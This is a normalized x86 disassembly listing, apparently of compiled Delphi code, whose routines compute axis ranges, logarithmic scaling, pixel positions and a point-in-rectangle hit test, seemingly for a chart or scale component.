jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x6 ] bl
mov [ esi + 0x5 ] bl
sub_47c4cc
push ebx
push esi
mov ebx edx
mov esi eax
lea edx [ esi + 0x6 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_477b20
test bl bl
je r-xdata
mov [ esi + 0x4 ] 0x0
cmp [ esi + 0x5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x4 ] 0x1
pop esi
pop ebx
retn
sub_47c4fc
push ebx
push esi
mov ebx edx
mov esi eax
lea edx [ esi + 0x5 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_477b20
test bl bl
je r-xdata
mov [ esi + 0x4 ] 0x0
cmp [ esi + 0x6 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x4 ] 0x1
pop esi
pop ebx
retn
sub_47c52c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47c575
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4044a0
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c57c
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_47c5ac
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_47c60c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x24 ] 0x2
jge r-xdata
lea ecx [ eax + 0x24 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c613
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_47c618
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47c6dc
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_47b384
test al al
je r-xdata
lea edx [ esi + 0x20 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_477b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c6e3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
mov eax esi
call sub_47be28
fld [ esi + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
fld [ esi + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
sub_47c6f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c746
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_477504
lea edx [ ebx + 0x44 ]
mov ecx esi
mov eax [ ebx + 0x90 ]
call sub_477b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c74d
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_47c754
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_47c7b2
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jge r-xdata
lea ecx [ eax + 0x50 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_477b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c7b9
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_47c838
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47c8c7
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov eax ebx
call sub_47b384
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebx + 0x90 ]
call sub_477ae4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c8ce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40abe8
sub_47c8dc
push ebp
mov ebp esp
push 0x0
mov edx eax
xor eax eax
push ebp
push sub_47c94c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x90 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax edx
call sub_47c958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c953
lea eax [ ebp - 0x4 ]
call sub_404094
retn
fld [ ebp + 0x8 ]
fcomp [ edx + 0x10 ]
fnstsw ax
sahf
jbe r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_47c974
push ebp
mov ebp esp
push 0x0
mov edx eax
xor eax eax
push ebp
push sub_47c9e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x90 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax edx
call sub_47ca70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c9eb
lea eax [ ebp - 0x4 ]
call sub_404094
retn
fld [ ebp + 0x8 ]
fcomp [ edx + 0x18 ]
fnstsw ax
sahf
jae r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_47c9f0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x6 ] 0x0
mov [ ebx + 0x5 ] 0x0
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_47c958
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_47ca70
fld [ ebx + 0x10 ]
fsub [ ebx + 0x18 ]
fld [ r-xdata ]
fcompp
fnstsw ax
sahf
jbe r-xdata
lea edx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
call sub_476964
pop ebx
pop ebp
retn 0x10
fld [ r-xdata ]
fadd [ ebx + 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_47ca70
sub_47cadc
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x90 ]
mov edx [ eax + 0x288 ]
cmp [ eax + 0x270 ] 0x0
je r-xdata
mov esi [ ebx + 0x30 ]
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov eax [ edx + 0x8 ]
cmp [ eax + 0x18 ] 0xffffff
jne r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x14 ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_47cb78
mov ebx [ esi + 0x4 ]
mov edi [ ebx + 0x288 ]
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebx + 0x280 ]
sar eax 0x1
jns r-xdata
mov eax [ edx + 0x8 ]
xor edx edx
call sub_41d1d4
push eax
mov eax [ esi + 0x14 ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
adc eax 0x0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_47cb78
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_47cee2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_472f94
sar eax 0x1
jns r-xdata
mov edx ebx
sub edx 0x1
jb r-xdata
adc eax 0x0
xor ecx ecx
mov cl [ esi + 0x8f ]
mov dl [ esi + 0x8e ]
mov edi edx
and edi 0x7f
lea edi [ edi * 8 + rw-data ]
mov edi [ edi + ecx * 4 ]
test dl dl
jne r-xdata
sub edx 0x59
je r-xdata
mov eax [ esi + 0x90 ]
mov edx [ eax + 0x288 ]
mov [ ebp - 0x1c ] edx
cmp [ esi + 0x8f ] 0x0
je r-xdata
sub [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x8e ] 0x0
je r-xdata
sub edx 0x5a
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax + 0x280 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov al [ esi + 0x8f ]
xor al 0x1
and eax 0x7f
mov edi [ eax * 4 + rw-data ]
jmp r-xdata
xor edx edx
mov dl [ esi + 0x8f ]
mov edi [ edx * 4 + rw-data ]
sub [ ebp - 0x4 ] eax
jmp r-xdata
mov cl [ esi + 0x8f ]
xor cl 0x1
and ecx 0x7f
mov dl [ esi + 0x8e ]
mov edi edx
and edi 0x7f
lea edi [ edi * 8 + rw-data ]
mov edi [ edi + ecx * 4 ]
test dl dl
jne r-xdata
sub edx 0x5a
je r-xdata
neg [ ebp - 0xc ]
cmp ebx 0x10e
jne r-xdata
mov edx edi
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebp + 0x8 ]
call sub_478914
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_472f94
mov [ ebp - 0xc ] eax
cmp ebx 0xb4
je r-xdata
add [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x8e ] 0x0
je r-xdata
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0xc ]
imul edi
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
call sub_402b00
cmp [ esi + 0x8e ] 0x0
je r-xdata
xor eax eax
mov al [ esi + 0x8f ]
mov edi [ eax * 4 + rw-data ]
jmp r-xdata
mov dl [ esi + 0x8f ]
xor dl 0x1
and edx 0x7f
mov edi [ edx * 4 + rw-data ]
add [ ebp - 0x4 ] eax
jmp r-xdata
xor edi edi
fild [ ebp - 0xc ]
fmul [ r-xdata ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fmulp st1
call sub_402b00
sub [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx 0xb4
jne r-xdata
cmp ebx 0xb4
jne r-xdata
cmp [ esi + 0x8f ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40412c
test edi edi
jle r-xdata
cmp [ esi + 0x8f ] 0x0
je r-xdata
cmp ebx 0x5a
je r-xdata
cmp [ esi + 0x8f ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x8 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cee9
lea eax [ ebp - 0x28 ]
call sub_404094
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040b8
retn
mov [ ebp - 0x20 ] edi
cmp ebx 0x5a
jne r-xdata
cmp ebx 0x5a
jne r-xdata
fild [ ebp - 0xc ]
fmul [ r-xdata ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fmulp st1
call sub_402b00
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x10e
jne r-xdata
sub [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_40412c
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_4045b4
jmp r-xdata
cmp ebx 0x10e
jne r-xdata
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x10e
jne r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0xb4
jne r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0x124 ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x4 ] eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x5a
je r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov ecx esi
mov edx 0x1
call sub_4045f4
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x4 ] eax
cmp ebx 0x10e
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0x118 ]
lea eax [ ebp - 0x28 ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_40427c
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
call sub_40c998
mov esi eax
test esi esi
jle r-xdata
sub_47cef8
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x5 ] 0x0
fld [ esi + 0x10 ]
fadd [ ebp + 0x8 ]
fstp [ esi + 0x10 ]
fwait
mov [ esi + 0x6 ] 0x0
fld [ esi + 0x18 ]
fadd [ ebp + 0x8 ]
fstp [ esi + 0x18 ]
fwait
mov eax [ esi + 0x90 ]
mov edx [ eax ]
call [ edx + 0x80 ]
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov al [ esi + 0x8e ]
push eax
xor ecx ecx
mov edx esi
mov eax [ esi + 0x90 ]
call sub_483a4c
fcomp [ esi + 0x10 ]
fnstsw ax
sahf
ja r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
mov al [ esi + 0x8e ]
push eax
mov cl 0x1
mov edx esi
mov eax [ esi + 0x90 ]
call sub_483a4c
fcomp [ esi + 0x18 ]
fnstsw ax
sahf
jae r-xdata
sub_47cf98
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
fld [ ebx + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
fld [ ebx + 0xb8 ]
fldln2
fxch st1
fyl2x
fstp [ edi ]
fwait
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
jmp r-xdata
fld [ ebx + 0xb0 ]
fldln2
fxch st1
fyl2x
fstp [ esi ]
fwait
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
fld [ ebx + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
fld [ esi ]
fsub [ edi ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_47d00c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
fld [ ebx + 0xc0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
cmp [ ebx + 0x8d ] 0x0
je r-xdata
mov eax [ esi + 0x280 ]
sar eax 0x1
jns r-xdata
fld [ ebp + 0x8 ]
fsub [ ebx + 0xb8 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0xb0 ]
fsub [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
adc eax 0x0
jmp r-xdata
fild [ esi + 0x280 ]
fmul [ r-xdata ]
fmul [ ebp - 0x8 ]
fdiv [ ebx + 0xc0 ]
call sub_402b00
sub_47d08c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov ebx edx
mov esi eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_47cf98
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ esi + 0xcc ]
jmp r-xdata
cmp [ esi + 0x8d ] 0x0
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp + 0x8 ]
fldln2
fxch st1
fyl2x
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp + 0x8 ]
fldln2
fxch st1
fyl2x
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x8d ] 0x0
jne r-xdata
mov edx [ esi + 0xd8 ]
sub edx eax
mov eax edx
add eax [ esi + 0xd4 ]
jmp r-xdata
fild [ esi + 0xdc ]
fmul [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
call sub_402b00
test bl bl
je r-xdata
mov eax [ esi + 0xd4 ]
jmp r-xdata
cmp [ esi + 0x8d ] 0x0
jne r-xdata
mov eax [ esi + 0xd8 ]
jmp r-xdata
sub_47d158
push ebp
mov ebp esp
cmp [ eax + 0x8e ] 0x0
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_47d1c4
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_47d180
jmp r-xdata
pop ebp
retn 0x8
sub_47d180
push ebp
mov ebp esp
cmp [ eax + 0xe0 ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_47d00c
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl [ eax + 0x8d ]
call sub_47d20c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl 0x1
call sub_47d08c
jmp r-xdata
pop ebp
retn 0x8
sub_47d1c4
push ebp
mov ebp esp
cmp [ eax + 0xe0 ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_47d00c
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl [ eax + 0x8d ]
xor dl 0x1
call sub_47d20c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_47d08c
jmp r-xdata
pop ebp
retn 0x8
sub_47d20c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
fld [ esi + 0xc0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp + 0x8 ]
fsub [ esi + 0xb8 ]
fild [ esi + 0xdc ]
fmulp st1
fdiv [ esi + 0xc0 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
fabs
fld [ r-xdata ]
fcompp
fnstsw ax
sahf
ja r-xdata
mov eax [ esi + 0xcc ]
jmp r-xdata
test bl bl
je r-xdata
mov eax [ esi + 0xcc ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
call sub_402b00
add eax [ esi + 0xd4 ]
fld [ ebp - 0x8 ]
call sub_402b00
push eax
mov eax [ esi + 0xd8 ]
pop edx
sub eax edx
jmp r-xdata
sub_47d2a4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov edx ebx
mov eax [ ebx + 0x90 ]
call sub_483960
test al al
je r-xdata
xor eax eax
mov eax [ ebx + 0xd8 ]
mov edx [ ebx + 0xd4 ]
cmp eax edx
jge r-xdata
mov esi edx
mov ebp eax
mov esi eax
mov ebp edx
jmp r-xdata
mov edi edx
sub edi [ rw-data ]
mov [ esp + 0x8 ] eax
mov edi eax
add edx [ rw-data ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov eax [ ebx + 0x5c ]
mov edx [ ebx + 0x2c ]
cmp eax edx
jge r-xdata
push ebp
lea eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
call sub_412f04
mov eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx ebp
mov edx edi
mov eax esi
call sub_412f04
jmp r-xdata
cmp [ ebx + 0x8e ] 0x0
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_412edc
push [ esp + 0x20 ]
push [ esp + 0x20 ]
lea eax [ esp + 0x14 ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
sub_47d39c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x4 ] esi
fild [ ebp - 0x4 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fmul [ eax + 0x98 ]
call sub_402b00
add eax ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0xd4 ] eax
mov [ ebp - 0x4 ] esi
fild [ ebp - 0x4 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fmul [ eax + 0xa0 ]
call sub_402b00
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0xd8 ] ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47d414
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8e ] 0x0
je r-xdata
push ebp
mov edx [ eax + 0x244 ]
mov eax [ eax + 0x292 ]
call sub_47d39c
pop ecx
push ebp
mov edx [ eax + 0x240 ]
mov eax [ eax + 0x28e ]
call sub_47d39c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47d370
pop ecx
pop ebp
retn
sub_47d464
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov ebp eax
mov edx edi
fld [ ebp + 0xa8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
mov eax edx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ ebp + 0x8e ]
test bl bl
je r-xdata
mov esi [ ecx + 0x8 ]
sub esi [ ecx ]
mov esi [ ecx + 0xc ]
sub esi [ ecx + 0x4 ]
jmp r-xdata
test bl bl
je r-xdata
neg esi
fld [ r-xdata ]
fmul [ ebp + 0xa8 ]
mov [ esp ] esi
fild [ esp ]
fmulp st1
call sub_402b00
mov esi eax
cmp [ ebp + 0x8f ] 0x0
je r-xdata
lea edx [ esi + edi ]
neg esi
sub_47d4e0
cmp [ eax + 0x8f ] 0x0
je r-xdata
cmp [ eax + 0x8e ] 0x0
je r-xdata
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ edx ]
mov eax [ edx + 0xc ]
jmp r-xdata
mov eax [ edx + 0x8 ]
retn
mov eax [ edx + 0x4 ]
jmp r-xdata
retn
sub_47d534
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x90 ]
mov eax [ esi + 0x288 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x28e ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
cmp [ esi + 0x278 ] 0x0
je r-xdata
cmp [ esi + 0x278 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x74 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
push 0x0
mov eax [ esi + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x2c ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
push eax
push 0x0
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
push 0x0
mov eax [ esi + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2c ]
